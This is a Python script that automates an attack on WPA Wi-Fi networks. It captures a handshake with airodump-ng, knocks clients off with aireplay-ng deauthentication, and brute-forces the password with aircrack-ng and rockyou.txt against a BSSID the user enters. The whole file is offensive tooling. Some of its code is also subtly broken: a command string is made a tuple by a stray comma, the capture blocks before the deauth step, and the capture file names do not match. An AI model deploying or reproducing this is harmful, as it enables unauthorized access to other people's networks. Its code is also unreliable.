import os, subprocess, re

# Command templates
monitorModeCmd = "sudo iw list | grep -o 'monitor' | sort -u",
getInterfaceCmd = "ip link show | grep -oP '(?<=: )[a-zA-Z0-9_-]+' | grep -E '^wl'"
findwifiCmd = "nmcli device wifi list"
setlinkUpCmd = "sudo ip link set {interface} up"
airmonKillCmd = "sudo airmon-ng check kill"
startAirmonCmd = "sudo airmon-ng start {interface}"
handshakeCmd = "sudo airodump-ng --bssid {bssid} -c {channel} --write {save_dir} --output-format cap {interface}mon"
deauthCmd = "sudo aireplay-ng --deauth 5 -a {bssid} {interface}mon"
bruteforceCmd = "sudo aircrack-ng -w rockyou.txt {cap_file}"

def monitorMode():
    checkMonitorMode = subprocess.run(monitorModeCmd, shell = True, capture_output = True, text = True)
    mm_available = 'monitor' in checkMonitorMode.stdout
    return mm_available

def wirelessInterface():
    getInterface = subprocess.run(getInterfaceCmd, shell = True, capture_output = True, text = True)
    interface = getInterface.stdout.strip()
    return interface

def availableNetworks():
    showNetworks = subprocess.run(findwifiCmd, shell = True, capture_output = True, text = True)
    print(showNetworks.stdout.strip())

def saveCred():
    inputCred = input("Enter BSSID & Channel : ").split()
    bssid = inputCred[0]
    channel = inputCred[1]
    return bssid, channel

def activateMonitorMode(interface):
    try:
        subprocess.run(setlinkUpCmd.format(interface=interface), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(airmonKillCmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(startAirmonCmd.format(interface=interface), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def captureHandshake(interface, bssid, channel):
    cap_file = "captureHS-01.cap"
    if os.path.exists(cap_file):
        os.remove(cap_file)
    subprocess.run(handshakeCmd.format(bssid=bssid, channel=channel, save_dir="captureHS", interface=interface), shell=True)
    # Move/rename the generated file to ensure only captureHS-01.cap exists
    generated_file = "captureHS-01.cap"
    if os.path.exists(generated_file):
        # Overwrite if exists
        os.replace(generated_file, cap_file)

def deauthInjection(interface, bssid):
    subprocess.run(deauthCmd.format(bssid=bssid, interface=interface), shell=True)

def resetMonitorMode(interface):
    try:
        subprocess.run(f"sudo airmon-ng stop {interface}mon", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(setlinkUpCmd.format(interface=interface), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run("sudo systemctl restart NetworkManager", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def bruteForceHandshake(cap_file):
    try:
        # Run aircrack-ng and stream output live
        process = subprocess.Popen(
            bruteforceCmd.format(cap_file=cap_file),
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        key_found = None
        for line in process.stdout:
            print(line, end='')  # Display output as it comes (percentages, etc.)
            if "KEY FOUND!" in line:
                match = re.search(r'KEY FOUND!\s+\[ (.+) \]', line)
                if match:
                    key_found = match.group(1)
        process.wait()
        if key_found:
            print(f"\nPassword found: {key_found}")
        else:
            print("\nPassword not found.")
    except KeyboardInterrupt:
        print("\nBrute-force interrupted by user.")
        # Continue execution in main after interruption

def main():
    if not monitorMode():
        print("Monitor Mode not supported on this device.")
        return

    interface = wirelessInterface()
    if not interface:
        print("No wireless interface found.")
        return

    print(f"Using interface: {interface}")
    availableNetworks()
    bssid, channel = saveCred()

    if activateMonitorMode(interface):
        print("Monitor mode activated.")
    else:
        print("Failed to activate monitor mode.")
        return

    try:
        print("Starting handshake capture...")
        captureHandshake(interface, bssid, channel)
        print("Deauthenticating clients...")
        deauthInjection(interface, bssid)
        print("Attempting to brute-force the handshake...")
        cap_file = ".captureHS-01.cap"
        bruteForceHandshake(cap_file)

    finally:
        print("Resetting monitor mode...")
        resetMonitorMode(interface)
        print("Done.")
    
if __name__ == "__main__":
    main()